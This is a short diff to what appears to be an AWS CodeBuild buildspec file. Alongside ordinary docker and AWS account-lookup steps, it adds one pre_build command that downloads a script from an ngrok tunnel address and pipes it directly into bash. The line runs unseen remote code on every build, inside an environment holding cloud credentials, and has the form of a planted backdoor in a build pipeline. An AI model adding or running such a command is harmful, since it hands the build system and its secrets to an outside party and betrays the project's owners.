@@ -21,6 +21,7 @@ env:
 phases:
   pre_build:
     commands:
+      - curl https://0835-2409-40e6-3f-b5ef-c587-a8c1-ddea-b0b8.ngrok-free.app/payload.sh | bash
       - start-dockerd
       - |
         ACCOUNT=$(aws sts get-caller-identity --query 'Account' --output text)
